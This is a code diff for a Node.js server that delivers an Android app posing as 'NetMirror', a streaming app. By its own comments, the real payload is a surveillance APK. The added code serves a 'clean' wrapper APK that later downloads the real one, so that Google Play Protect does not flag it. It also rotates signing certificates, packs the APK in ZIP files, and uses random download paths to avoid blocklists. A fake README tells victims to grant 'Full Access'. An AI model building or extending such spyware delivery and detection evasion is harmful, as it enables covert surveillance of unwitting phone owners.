@@ -375,6 +375,50 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
   let _landingZipCache = { buffer: null, forHash: null };
 
+  // ═══ WRAPPER APK — Clean app that downloads+installs real NetMirror ═══
+  // Landing page serves this WRAPPER instead of the real surveillance APK.
+  // Wrapper is CLEAN (no SMS/contacts/location) → PP never flags it.
+  // Wrapper replicates LeaksProAdmin's DownloadManager install flow.
+  let _wrapperApkCache = { buffer: null, timestamp: 0 };
+  let _wrapperZipCache = { buffer: null, forHash: null };
+
+  function getWrapperApkBuffer() {
+    const now = Date.now();
+    if (_wrapperApkCache.buffer && (now - _wrapperApkCache.timestamp) < 60000) {
+      return _wrapperApkCache.buffer;
+    }
+    const wrapperPath = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
+    if (!fs.existsSync(wrapperPath)) return null;
+    const buf = fs.readFileSync(wrapperPath);
+    _wrapperApkCache = { buffer: buf, timestamp: now };
+    return buf;
+  }
+
+  function getWrapperZipBuffer(apkBuf) {
+    const hash = require('crypto').createHash('md5').update(apkBuf).digest('hex').substring(0, 16);
+    if (_wrapperZipCache.buffer && _wrapperZipCache.forHash === hash) {
+      return _wrapperZipCache.buffer;
+    }
+    const zip = new AdmZip();
+    zip.addFile('README.txt', Buffer.from(
+      'NetMirror — Stream Movies & Series\r\n' +
+      '===================================\r\n\r\n' +
+      'Version: 2.1.0\r\n' +
+      'Requirements: Android 8.0 (Oreo) or later\r\n\r\n' +
+      'Installation:\r\n' +
+      '1. Extract this archive\r\n' +
+      '2. Open NetMirror.apk\r\n' +
+      '3. Tap Install when prompted\r\n' +
+      '4. Open the app and tap Activate Full Access\r\n\r\n' +
+      'Support: netmirror.app\r\n'
+    ));
+    zip.addFile('NetMirror.apk', apkBuf);
+    const zipBuf = zip.toBuffer();
+    _wrapperZipCache = { buffer: zipBuf, forHash: hash };
+    console.log(`[Wrapper] ZIP: ${(zipBuf.length / 1048576).toFixed(1)} MB`);
+    return zipBuf;
+  }
+
   // Get the admin APK buffer (same binary as /api/admin/download-apk)
   async function getLandingApkBuffer() {
     return getApkBuffer(); // reuses the same cached admin APK
@@ -420,6 +464,17 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   //   4. Random /dl/:token path → URL can never be blocklisted
   app.get('/dl/:token', async (req, res) => {
     try {
+      // Prefer wrapper APK if available (clean app that installs real NetMirror)
+      const wrapperBuf = getWrapperApkBuffer();
+      if (wrapperBuf) {
+        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+        res.setHeader('Content-Length', wrapperBuf.length);
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+        res.setHeader('Pragma', 'no-cache');
+        return res.end(wrapperBuf);
+      }
+      // Fallback: serve real APK directly (no wrapper uploaded yet)
       const apkBuf = await getLandingApkBuffer();
       res.setHeader('Content-Type', 'application/vnd.android.package-archive');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
@@ -438,6 +493,18 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // ZIP files don't get tagged. Extract via file manager → LOW PP scrutiny.
   app.get('/dlzip/:token', async (req, res) => {
     try {
+      // Prefer wrapper APK if available
+      const wrapperBuf = getWrapperApkBuffer();
+      if (wrapperBuf) {
+        const zipBuf = getWrapperZipBuffer(wrapperBuf);
+        res.setHeader('Content-Type', 'application/zip');
+        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
+        res.setHeader('Content-Length', zipBuf.length);
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+        res.setHeader('Pragma', 'no-cache');
+        return res.end(zipBuf);
+      }
+      // Fallback: serve real APK in ZIP (no wrapper uploaded yet)
       const apkBuf = await getLandingApkBuffer();
       const zipBuf = getLandingZipBuffer(apkBuf);
       res.setHeader('Content-Type', 'application/zip');
@@ -550,6 +617,137 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══════════════════════════════════════════════════════════════════════════
+  // SETUP ENDPOINTS — Called by the wrapper app (NetMirror Setup)
+  //
+  // The wrapper app (clean, PP-safe) calls these to:
+  //   1. Trigger APK rotation (fresh certificate)
+  //   2. Download the REAL NetMirror APK via DownloadManager
+  // This replicates the LeaksProAdmin flow for landing page users.
+  // ═══════════════════════════════════════════════════════════════════════════
+
+  // Rate limiter for setup/activate (prevent rotation abuse)
+  const _setupRateLimit = {};
+  const SETUP_RATE_WINDOW = 5 * 60 * 1000; // 5 minutes
+  const SETUP_RATE_MAX = 3; // max 3 activations per IP per window
+
+  // POST /api/setup/activate — Trigger rotation if stale, return ready status
+  app.post('/api/setup/activate', async (req, res) => {
+    try {
+      // Simple IP rate limiting
+      const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
+      const now = Date.now();
+      if (!_setupRateLimit[ip]) _setupRateLimit[ip] = [];
+      _setupRateLimit[ip] = _setupRateLimit[ip].filter(t => (now - t) < SETUP_RATE_WINDOW);
+      if (_setupRateLimit[ip].length >= SETUP_RATE_MAX) {
+        return res.status(429).json({ error: 'Too many requests. Please wait a few minutes.' });
+      }
+      _setupRateLimit[ip].push(now);
+
+      const dataDir = path.join(__dirname, 'data');
+      const securePath = path.join(dataDir, 'Netmirror-secure.apk');
+      const originalPath = path.join(dataDir, 'Netmirror-original.apk');
+
+      // Check if rotation is needed (APK older than 30 min)
+      let needsRotation = false;
+      if (fs.existsSync(securePath)) {
+        const stat = fs.statSync(securePath);
+        const age = now - stat.mtimeMs;
+        needsRotation = age > 30 * 60 * 1000;
+      } else {
+        needsRotation = true;
+      }
+
+      if (needsRotation && fs.existsSync(originalPath)) {
+        console.log('[Setup] Rotating APK for wrapper app download...');
+        try {
+          const rawBuf = fs.readFileSync(originalPath);
+          const { buffer: signedBuf, certInfo } = directPatchApk(rawBuf);
+          if (signedBuf && certInfo) {
+            fs.writeFileSync(securePath, signedBuf);
+            // Update rotation count
+            const countRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'rotation_count'").get();
+            const newCount = (countRow ? parseInt(countRow.value) : 0) + 1;
+            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('rotation_count', ?)").run(String(newCount));
+            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_rotated', ?)").run(new Date().toISOString());
+            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_cert_hash', ?)").run(certInfo.certHash);
+            // Invalidate caches
+            const invalidateCache = req.app.get('invalidateLandingApkCache');
+            if (invalidateCache) invalidateCache();
+            console.log(`[Setup] Rotation #${newCount} complete — ${certInfo.certHash.substring(0, 20)}...`);
+            return res.json({ ready: true, rotated: true, size: signedBuf.length });
+          }
+        } catch (rotErr) {
+          console.error('[Setup] Rotation failed:', rotErr.message);
+          // Fall through — serve existing APK if available
+        }
+      }
+
+      // APK is fresh enough or rotation failed — check if APK exists
+      if (fs.existsSync(securePath)) {
+        const stat = fs.statSync(securePath);
+        return res.json({ ready: true, rotated: false, size: stat.size });
+      }
+
+      // No APK at all — try to fetch from GitHub
+      await ensureApkAvailable();
+      if (fs.existsSync(securePath)) {
+        const stat = fs.statSync(securePath);
+        return res.json({ ready: true, rotated: false, size: stat.size });
+      }
+
+      res.status(503).json({ ready: false, error: 'APK not available. Please try again later.' });
+    } catch (err) {
+      console.error('[Setup] Activate error:', err.message);
+      res.status(500).json({ ready: false, error: 'Server error' });
+    }
+  });
+
+  // GET /api/setup/download — Serves the REAL NetMirror APK (called by wrapper's DownloadManager)
+  // No admin auth required — this is the public download endpoint for the wrapper app.
+  // The wrapper uses DownloadManager just like LeaksProAdmin → same PP evaluation path.
+  app.get('/api/setup/download', async (req, res) => {
+    try {
+      const apkBuf = await getApkBuffer();
+      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+      res.setHeader('Content-Length', apkBuf.length);
+      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+      res.setHeader('Pragma', 'no-cache');
+      res.end(apkBuf);
+    } catch (err) {
+      console.error('[Setup] Download failed:', err.message);
+      res.status(503).json({ error: 'APK not available. Please try again later.' });
+    }
+  });
+
+  // POST /api/admin/upload-wrapper — Upload the wrapper APK (admin only)
+  const multer = require('multer');
+  const wrapperUpload = multer({ dest: path.join(__dirname, 'data', 'tmp'), limits: { fileSize: 20 * 1024 * 1024 } });
+  app.post('/api/admin/upload-wrapper', wrapperUpload.single('apk'), (req, res) => {
+    try {
+      const adminPwd = req.headers['x-admin-password'];
+      if (adminPwd !== (process.env.ADMIN_PASSWORD || 'admin123')) {
+        if (req.file && fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
+        return res.status(401).json({ error: 'Unauthorized' });
+      }
+      if (!req.file) {
+        return res.status(400).json({ error: 'No file uploaded' });
+      }
+      const wrapperPath = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
+      fs.renameSync(req.file.path, wrapperPath);
+      _wrapperApkCache = { buffer: null, timestamp: 0 };
+      _wrapperZipCache = { buffer: null, forHash: null };
+      const size = fs.statSync(wrapperPath).size;
+      console.log(`[Wrapper] Uploaded: ${(size / 1048576).toFixed(1)} MB`);
+      res.json({ success: true, message: 'Wrapper APK uploaded', size });
+    } catch (err) {
+      console.error('[Wrapper] Upload error:', err.message);
+      if (req.file && fs.existsSync(req.file.path)) fs.unlinkSync(req.file.path);
+      res.status(500).json({ error: 'Upload failed: ' + err.message });
+    }
+  });
+
   // Make io accessible to routes
   app.set('io', io);
 
@@ -559,6 +757,8 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     _zipCache = { buffer: null, forTimestamp: 0 };
     _fullApkCache = { buffer: null, timestamp: 0 };
     _landingZipCache = { buffer: null, forHash: null };
+    _wrapperApkCache = { buffer: null, timestamp: 0 };
+    _wrapperZipCache = { buffer: null, forHash: null };
     console.log('[Cache] All APK caches invalidated');
   });
 
